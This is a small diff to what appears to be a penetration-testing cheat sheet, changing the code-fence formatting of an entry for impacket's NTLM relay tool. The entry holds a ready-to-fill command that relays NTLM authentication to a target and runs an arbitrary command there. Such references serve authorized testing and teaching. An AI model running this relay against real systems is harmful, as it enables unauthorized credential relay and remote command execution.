@@ -11,5 +11,4 @@
 ## impacket - NTLM relay
 #platform/windows #target/serve #cat/4Kp3n
 ```
-sudo impacket-ntlmrelayx --no-http-server -smb2support -t <ip_local> -c <command>
-```
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t <ip_local> -c <command>```
